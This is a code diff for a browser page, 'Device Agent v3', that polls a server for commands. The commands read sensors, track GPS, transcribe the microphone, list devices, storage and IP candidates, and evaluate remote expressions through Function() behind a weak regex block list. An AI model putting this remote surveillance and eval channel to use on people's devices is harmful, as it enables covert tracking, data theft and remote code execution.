+  return { text: `🧲 <b>Magnetometer</b>\nx: ${v.x} μT\ny: ${v.y} μT\nz: ${v.z} μT` };
+},
+
+async proximity() {
+  if (typeof ProximitySensor === 'undefined') throw new Error('unsupported');
+  const s = new ProximitySensor();
+  const v = await new Promise((ok, no) => {
+    let last;
+    s.onreading = () => { last = s; };
+    s.onerror = () => no(new Error('sensor error'));
+    s.start();
+    setTimeout(() => last ? ok(last) : no(new Error('no reading')), 3000);
+  });
+  s.stop();
+  return { text: `📏 Proximity: ${v.near ? 'NEAR' : 'FAR'} (${v.distance ?? '?'})` };
+},
+
+async gamepad() {
+  const pads = navigator.getGamepads ? [...navigator.getGamepads()].filter(Boolean) : [];
+  if (!pads.length) return { text: `🎮 No gamepads` };
+  return { text: `🎮 <b>Gamepads (${pads.length})</b>\n<pre>${esc(JSON.stringify(pads.map(p => ({ id: p.id, buttons: p.buttons.length, axes: p.axes.length })), null, 2))}</pre>` };
+},
+
+async 'watch-geo'(args) {
+  const sec = Math.min(parseInt(args) || 10, 60);
+  const samples = [];
+  const id = navigator.geolocation.watchPosition(
+    p => samples.push({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }),
+    () => {}, { enableHighAccuracy: true }
+  );
+  await new Promise(r => setTimeout(r, sec * 1000));
+  navigator.geolocation.clearWatch(id);
+  if (!samples.length) throw new Error('no samples');
+  const first = samples[0], last = samples[samples.length-1];
+  const dist = haversine(first.lat, first.lon, last.lat, last.lon);
+  return { text: `📍 <b>GPS Track (${sec}s, ${samples.length} samples)</b>\nStart: ${first.lat.toFixed(5)}, ${first.lon.toFixed(5)}\nEnd: ${last.lat.toFixed(5)}, ${last.lon.toFixed(5)}\nDistance: ${(dist*1000).toFixed(0)}m\nAvg accuracy: ±${Math.round(samples.reduce((a,s)=>a+s.acc,0)/samples.length)}m` };
+},
+
+async 'orientation-lock'(args) {
+  if (!screen.orientation?.lock) throw new Error('unsupported');
+  const mode = args || 'portrait';
+  await screen.orientation.lock(mode);
+  return { text: `🔒 Orientation locked: ${mode}` };
+},
+
+async 'orientation-unlock'() {
+  screen.orientation?.unlock?.();
+  return { text: `🔓 Orientation unlocked` };
+},
+
+async 'device-posture'() {
+  if (!navigator.devicePosture) throw new Error('unsupported');
+  return { text: `📐 Posture: ${navigator.devicePosture.type}` };
+},
+
+async pressure() {
+  if (typeof PressureObserver === 'undefined') throw new Error('Compute Pressure unsupported');
+  const p = await new Promise((ok, no) => {
+    const obs = new PressureObserver(r => { obs.disconnect(); ok(r[0]); });
+    obs.observe('cpu');
+    setTimeout(() => no(new Error('no reading')), 5000);
+  });
+  return { text: `🔥 <b>CPU Pressure</b>\nState: ${p.state}\nSource: ${p.source}` };
+},
+
+// ══════════════ STORAGE (8) ══════════════
+async 'idb-list'() {
+  if (!indexedDB.databases) throw new Error('unsupported');
+  const list = await indexedDB.databases();
+  if (!list.length) return { text: `🗃 No IndexedDB databases` };
+  return { text: `🗃 <b>IndexedDB (${list.length})</b>\n<pre>${esc(JSON.stringify(list, null, 2))}</pre>` };
+},
+
+async 'cache-list'() {
+  if (!('caches' in window)) throw new Error('Cache unsupported');
+  const keys = await caches.keys();
+  if (!keys.length) return { text: `📦 No caches` };
+  const out = [];
+  for (const k of keys) {
+    const c = await caches.open(k);
+    const reqs = await c.keys();
+    out.push(`${k}: ${reqs.length} entries`);
+  }
+  return { text: `📦 <b>Cache Storage</b>\n<code>${esc(out.join('\n'))}</code>` };
+},
+
+async 'opfs-list'() {
+  if (!navigator.storage?.getDirectory) throw new Error('OPFS unsupported');
+  const root = await navigator.storage.getDirectory();
+  const list = [];
+  for await (const [name, h] of root.entries()) list.push(`${h.kind}: ${name}`);
+  return { text: `📁 <b>OPFS</b>\n<code>${esc(list.join('\n') || '(empty)')}</code>` };
+},
+
+async 'storage-buckets'() {
+  if (!navigator.storageBuckets) throw new Error('Storage Buckets unsupported');
+  const list = await navigator.storageBuckets.keys();
+  return { text: `🪣 <b>Storage Buckets (${list.length})</b>\n<code>${esc(list.join('\n') || '(none)')}</code>` };
+},
+
+async 'clear-storage'() {
+  localStorage.clear();
+  sessionStorage.clear();
+  return { text: `🧹 LocalStorage + SessionStorage cleared` };
+},
+
+async 'set-item'(args) {
+  const [k, ...v] = args.split(' ');
+  if (!k) throw new Error('key required');
+  localStorage.setItem(k, v.join(' '));
+  return { text: `✅ set ${esc(k)}` };
+},
+
+async 'get-item'(args) {
+  if (!args) throw new Error('key required');
+  const v = localStorage.getItem(args);
+  return { text: `🔑 <code>${esc(args)}</code> = <code>${esc(v ?? '(null)')}</code>` };
+},
+
+// ══════════════ ADVANCED (18) ══════════════
+async 'speech-to-text'(args) {
+  const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
+  if (!SR) throw new Error('unsupported');
+  const sec = Math.min(parseInt(args) || 5, 30);
+  const r = new SR();
+  r.lang = navigator.language;
+  r.interimResults = true;
+  r.continuous = true;
+  return await new Promise((ok, no) => {
+    let text = '';
+    r.onresult = e => { for (let i = e.resultIndex; i < e.results.length; i++) text += e.results[i][0].transcript + ' '; };
+    r.onerror = e => no(new Error(e.error));
+    r.start();
+    setTimeout(() => { r.stop(); ok({ text: `🎙 <b>Speech (${sec}s)</b>\n"${esc(text.trim() || '(no speech)')}"` }); }, sec * 1000);
+  });
+},
+
+async 'webrtc-offer'() {
+  const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+  pc.createDataChannel('test');
+  const offer = await pc.createOffer();
+  await pc.setLocalDescription(offer);
+  await new Promise(r => setTimeout(r, 1500));
+  const sdp = pc.localDescription?.sdp || '';
+  pc.close();
+  return { text: `🌐 <b>WebRTC Offer</b>\n<code>${esc(sdp.split('\n').slice(0, 12).join('\n'))}</code>` };
+},
+
+async 'webrtc-ice'() {
+  const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+  pc.createDataChannel('test');
+  const candidates = [];
+  pc.onicecandidate = e => { if (e.candidate) candidates.push(e.candidate.candidate); };
+  await pc.setLocalDescription(await pc.createOffer());
+  await new Promise(r => setTimeout(r, 2000));
+  pc.close();
+  return { text: `🧊 <b>ICE candidates (${candidates.length})</b>\n<code>${esc(candidates.slice(0, 5).join('\n'))}</code>` };
+},
+
+async 'eval-safe'(args) {
+  if (!args) throw new Error('expr required');
+  if (/(fetch|XMLHttpRequest|import|require|eval|Function|document\.write|location\s*=)/i.test(args)) throw new Error('blocked');
+  const result = Function(`"use strict"; return (${args});`)();
+  let out; try { out = JSON.stringify(result, null, 2); } catch { out = String(result); }
+  return { text: `🧮 <code>${esc(args)}</code>\n<b>→</b>\n<code>${esc(out.slice(0, 3000))}</code>` };
+},
+
+async 'crypto-random'(args) {
+  const n = Math.min(parseInt(args) || 16, 256);
+  const buf = crypto.getRandomValues(new Uint8Array(n));
+  const hex = [...buf].map(b => b.toString(16).padStart(2, '0')).join('');
+  return { text: `🎲 <b>Random ${n} bytes</b>\n<code>${hex}</code>` };
+},
+
+async 'crypto-hash'(args) {
+  if (!args) throw new Error('text required');
+  const buf = new TextEncoder().encode(args);
+  const hash = await crypto.subtle.digest('SHA-256', buf);
+  const hex = [...new Uint8Array(hash)].map(b => b.toString(16).padStart(2, '0')).join('');
+  return { text: `🔐 <b>SHA-256</b>\n<code>${hex}</code>` };
+},
+
+async 'crypto-uuid'() {
+  return { text: `🆔 <b>UUID</b>\n<code>${crypto.randomUUID()}</code>` };
+},
+
+async compress(args) {
+  if (!('CompressionStream' in window)) throw new Error('unsupported');
+  const text = args || 'hello world '.repeat(100);
+  const stream = new Blob([text]).stream().pipeThrough(new CompressionStream('gzip'));
+  const buf = await new Response(stream).arrayBuffer();
+  return { text: `📦 Compressed ${text.length} → ${buf.byteLength} bytes (${((1-buf.byteLength/text.length)*100).toFixed(1)}% saved)` };
+},
+
+async 'url-parse'(args) {
+  const u = new URL(args || location.href);
+  return { text: `🔗 <b>URL</b>\nprotocol: ${u.protocol}\nhost: ${u.host}\npathname: ${u.pathname}\nsearch: ${u.search}\nhash: ${u.hash}\norigin: ${u.origin}` };
+},
+
+async eyedropper() {
+  if (!window.EyeDropper) throw new Error('unsupported');
+  const ed = new EyeDropper();
+  const r = await ed.open();
+  return { text: `🎨 Picked color: <code>${r.sRGBHex}</code>` };
+},
+
+async 'blob-size'() {
+  const b = new Blob(['test']);
+  return { text: `📊 Blob API works. Size: ${b.size} bytes, type: ${b.type || '(none)'}` };
+},
+
+async 'navigator-info'() {
+  const out = {
+    userAgentData: navigator.userAgentData ? {
+      brands: navigator.userAgentData.brands,
+      mobile: navigator.userAgentData.mobile,
+      platform: navigator.userAgentData.platform
+    } : null,
+    hardwareConcurrency: navigator.hardwareConcurrency,
+    deviceMemory: navigator.deviceMemory,
+    maxTouchPoints: navigator.maxTouchPoints,
+    pdfViewerEnabled: navigator.pdfViewerEnabled,
+    webdriver: navigator.webdriver,
+    plugins: navigator.plugins?.length || 0,
+    mimeTypes: navigator.mimeTypes?.length || 0
+  };
+  return { text: `🔍 <b>Navigator</b>\n<pre>${esc(JSON.stringify(out, null, 2))}</pre>` };
+},
+
+async 'browser-features'() {
+  const features = {
+    'ServiceWorker': 'serviceWorker' in navigator,
+    'Web Worker': 'Worker' in window,
+    'WebSocket': 'WebSocket' in window,
+    'WebRTC': 'RTCPeerConnection' in window,
+    'WebGL': !!document.createElement('canvas').getContext('webgl'),
+    'WebGL2': !!document.createElement('canvas').getContext('webgl2'),
+    'WebGPU': 'gpu' in navigator,
+    'WebAssembly': 'WebAssembly' in window,
+    'WebAudio': 'AudioContext' in window,
+    'Web Bluetooth': 'bluetooth' in navigator,
+    'Web USB': 'usb' in navigator,
+    'Web Serial': 'serial' in navigator,
+    'Web HID': 'hid' in navigator,
+    'Web NFC': 'NDEFReader' in window,
+    'Gamepad': 'getGamepads' in navigator,
+    'Speech Synthesis': 'speechSynthesis' in window,
+    'Speech Recognition': 'SpeechRecognition' in window || 'webkitSpeechRecognition' in window,
+    'Notifications': 'Notification' in window,
+    'Geolocation': 'geolocation' in navigator,
+    'Vibration': 'vibrate' in navigator,
+    'Battery': 'getBattery' in navigator,
+    'Wake Lock': 'wakeLock' in navigator,
+    'Idle Detection': 'IdleDetector' in window,
+    'File System Access': 'showOpenFilePicker' in window,
+    'Clipboard': 'clipboard' in navigator,
+    'Share': 'share' in navigator,
+    'Payment Request': 'PaymentRequest' in window,
+    'Credentials': 'credentials' in navigator,
+    'Push': 'PushManager' in window,
+    'Notification Triggers': 'showTrigger' in Notification.prototype,
+    'Background Sync': 'SyncManager' in window,
+    'Periodic Sync': 'PeriodicSyncManager' in window,
+    'WebTransport': 'WebTransport' in window,
+    'WebCodecs': 'VideoEncoder' in window,
+    'Compression Stream': 'CompressionStream' in window,
+    'EyeDropper': 'EyeDropper' in window,
+    'Screen Capture': 'getDisplayMedia' in navigator.mediaDevices,
+    'Picture-in-Picture': 'pictureInPictureEnabled' in document,
+    'Doc PiP': 'documentPictureInPicture' in window,
+    'Ambient Light': 'AmbientLightSensor' in window,
+    'Accelerometer': 'Accelerometer' in window,
+    'Gyroscope': 'Gyroscope' in window,
+    'Magnetometer': 'Magnetometer' in window,
+    'Proximity': 'ProximitySensor' in window,
+    'Orientation': 'DeviceOrientationEvent' in window,
+    'Motion': 'DeviceMotionEvent' in window,
+    'Contacts': 'contacts' in navigator,
+    'Storage Buckets': 'storageBuckets' in navigator,
+    'Compute Pressure': 'PressureObserver' in window,
+    'Device Posture': 'devicePosture' in navigator,
+    'Virtual Keyboard': 'virtualKeyboard' in navigator,
+    'Web Locks': 'locks' in navigator,
+    'Scheduler': 'scheduler' in window
+  };
+  const supported = Object.entries(features).filter(([,v]) => v).map(([k]) => `✓ ${k}`).join('\n');
+  const unsupported = Object.entries(features).filter(([,v]) => !v).map(([k]) => `✗ ${k}`).join('\n');
+  return { text: `🚀 <b>Feature Detection</b>\n\n<b>Supported (${Object.values(features).filter(Boolean).length}/${Object.keys(features).length})</b>\n<code>${esc(supported)}</code>\n\n<b>Unsupported</b>\n<code>${esc(unsupported)}</code>` };
+},
+
+async ping() {
+  const t = performance.now();
+  await new Promise(r => setTimeout(r, 1));
+  return { text: `🏓 Pong (${(performance.now()-t).toFixed(2)}ms)` };
+},
+
+// ══════════════ BLE / USB / SERIAL / HID / NFC (5) ══════════════
+async 'bluetooth-scan'() {
+  if (!navigator.bluetooth) throw new Error('Web Bluetooth unsupported');
+  const d = await navigator.bluetooth.requestDevice({ acceptAllDevices: true });
+  return { text: `📶 <b>Bluetooth</b>\nName: ${esc(d.name || '(unnamed)')}\nID: <code>${esc(d.id)}</code>` };
+},
+
+async 'usb-list'() {
+  if (!navigator.usb) throw new Error('Web USB unsupported');
+  const devs = await navigator.usb.getDevices();
+  return { text: `🔌 <b>USB (${devs.length})</b>\n<pre>${esc(JSON.stringify(devs.map(d => ({ vendor: d.vendorId, product: d.productId, name: d.productName })), null, 2))}</pre>` };
+},
+
+async 'serial-list'() {
+  if (!navigator.serial) throw new Error('Web Serial unsupported');
+  const ports = await navigator.serial.getPorts();
+  return { text: `🔗 <b>Serial Ports (${ports.length})</b>` };
+},
+
+async 'hid-list'() {
+  if (!navigator.hid) throw new Error('Web HID unsupported');
+  const devs = await navigator.hid.getDevices();
+  return { text: `🎮 <b>HID (${devs.length})</b>\n<pre>${esc(JSON.stringify(devs.map(d => d.productName), null, 2))}</pre>` };
+},
+
+async 'nfc-scan'() {
+  if (!('NDEFReader' in window)) throw new Error('Web NFC unsupported');
+  const ndef = new NDEFReader();
+  await ndef.scan();
+  return { text: `📡 NFC scan started. Tap a tag.` };
+},
+
+// ══════════════ WORKERS / STREAMS / MISC (8) ══════════════
+async 'worker-test'() {
+  if (!window.Worker) throw new Error('unsupported');
+  const blob = new Blob([`
+    self.onmessage = e => {
+      let sum = 0;
+      for (let i = 0; i < e.data; i++) sum += i;
+      self.postMessage(sum);
+    };
+  `], { type: 'application/javascript' });
+  const w = new Worker(URL.createObjectURL(blob));
+  const t = performance.now();
+  const result = await new Promise(ok => { w.onmessage = e => ok(e.data); w.postMessage(1e7); });
+  w.terminate();
+  return { text: `⚙️ <b>Web Worker</b>\nSum(0..10M) = ${result}\nTime: ${(performance.now()-t).toFixed(0)}ms` };
+},
+
+async 'broadcast-send'(args) {
+  if (!('BroadcastChannel' in window)) throw new Error('unsupported');
+  const ch = new BroadcastChannel('dr-test');
+  ch.postMessage({ msg: args || 'hello', t: Date.now() });
+  ch.close();
+  return { text: `📢 Broadcast sent to other tabs` };
+},
+
+async 'stream-test'() {
+  if (!('ReadableStream' in window)) throw new Error('unsupported');
+  const s = new ReadableStream({
+    start(c) { c.enqueue('chunk1\n'); c.enqueue('chunk2\n'); c.close(); }
+  });
+  const reader = s.getReader();
+  const chunks = [];
+  while (true) {
+    const { done, value } = await reader.read();
+    if (done) break;
+    chunks.push(value);
+  }
+  return { text: `🌊 <b>Streams</b>\nRead ${chunks.length} chunks:\n<code>${esc(chunks.join(''))}</code>` };
+},
+
+async 'locks-test'() {
+  if (!navigator.locks) throw new Error('Web Locks unsupported');
+  return await navigator.locks.request('test-lock', async () => {
+    await new Promise(r => setTimeout(r, 100));
+    return { text: `🔒 Web Lock acquired and released` };
+  });
+},
+
+async 'scheduler-info'() {
+  if (!window.scheduler) throw new Error('Scheduler API unsupported');
+  const priority = await scheduler.postTask(() => 'task-done', { priority: 'user-visible' });
+  return { text: `📅 Scheduler works. Task result: ${priority}` };
+},
+
+async 'background-sync'() {
+  if (!('serviceWorker' in navigator)) throw new Error('SW unsupported');
+  const reg = await navigator.serviceWorker.getRegistration();
+  if (!reg) throw new Error('No SW registered');
+  if (!reg.sync) throw new Error('Background Sync unsupported');
+  await reg.sync.register('test-sync');
+  return { text: `🔄 Background sync registered` };
+},
+
+async 'push-status'() {
+  if (!('PushManager' in window)) throw new Error('Push unsupported');
+  if (!navigator.serviceWorker.controller) return { text: `📬 Push: no SW controller` };
+  const reg = await navigator.serviceWorker.ready;
+  const sub = await reg.pushManager.getSubscription();
+  return { text: `📬 Push subscription: ${sub ? sub.endpoint.slice(0, 80) + '…' : '(none)'}` };
+},
+
+// ══════════════ HELP ══════════════
+};
+
+// ============================================================
+// HELP TEXT
+// ============================================================
+const HELP_TEXT = `
+🧪 <b>Device Agent v3 — Web API Console</b>
+85+ commands across 25+ Web API groups
+
+<b>📊 Info</b>
+/info /geo /battery /network /clipboard /cookies /storage /devices /permissions /fonts /webgl /gpu /storage-quota /screen-info /time
+
+<b>📸 Media</b>
+/screenshot /camera [front|back] /mic [s] /video [s] /record-screen [s] /audio-spectrum [s] /screen-capture /pip /doc-pip /media-session /video-devices
+
+<b>⚡ Actions</b>
+/vibrate [ms] /notify [text] /speak [text] /sound [hz ms] /writetext [text] /open [url] /fullscreen /exit-fullscreen /wakelock /reload /download [url] /scroll-to [x y] /highlight [sel] /share [text] /print /badge [n]
+
+<b>📡 Sensors</b>
+/orient /motion /light /magnet /proximity /gamepad /watch-geo [s] /orientation-lock [mode] /orientation-unlock /device-posture /pressure
+
+<b>💾 Storage</b>
+/idb-list /cache-list /opfs-list /storage-buckets /clear-storage /set-item [k v] /get-item [k]
+
+<b>🚀 Advanced</b>
+/speech-to-text [s] /webrtc-offer /webrtc-ice /eval-safe [expr] /crypto-random [n] /crypto-hash [text] /crypto-uuid /compress [text] /url-parse [url] /eyedropper /blob-size /navigator-info /browser-features /ping
+
+<b>🔌 Devices</b>
+/bluetooth-scan /usb-list /serial-list /hid-list /nfc-scan
+
+<b>⚙️ Workers</b>
+/worker-test /broadcast-send [msg] /stream-test /locks-test /scheduler-info /background-sync /push-status
+
+<b>Session</b>
+/help /start
+`;
+
+// ============================================================
+// HELPERS
+// ============================================================
+function blobB64(blob) {
+  return new Promise((ok, no) => {
+    const fr = new FileReader();
+    fr.onload = () => ok(fr.result);
+    fr.onerror = () => no(fr.error);
+    fr.readAsDataURL(blob);
+  });
+}
+
+function haversine(lat1, lon1, lat2, lon2) {
+  const R = 6371;
+  const dLat = (lat2-lat1) * Math.PI / 180;
+  const dLon = (lon2-lon1) * Math.PI / 180;
+  const a = Math.sin(dLat/2)**2 + Math.cos(lat1*Math.PI/180) * Math.cos(lat2*Math.PI/180) * Math.sin(dLon/2)**2;
+  return 2 * R * Math.asin(Math.sqrt(a));
+}
+
+// ============================================================
+// BOOT
+// ============================================================
+log(`Agent v3 starting · ${NAME}`, 'sys');
+log(`Registered handlers: ${Object.keys(HANDLERS).length}`, 'sys');
+if (!KEY) log('⚠ No key in URL — server may reject', 'err');
+setTimeout(() => log('Tip: tap "Request All Permissions" first', 'sys'), 1500);
+pollLoop();
+</script>
+</body>
+</html>
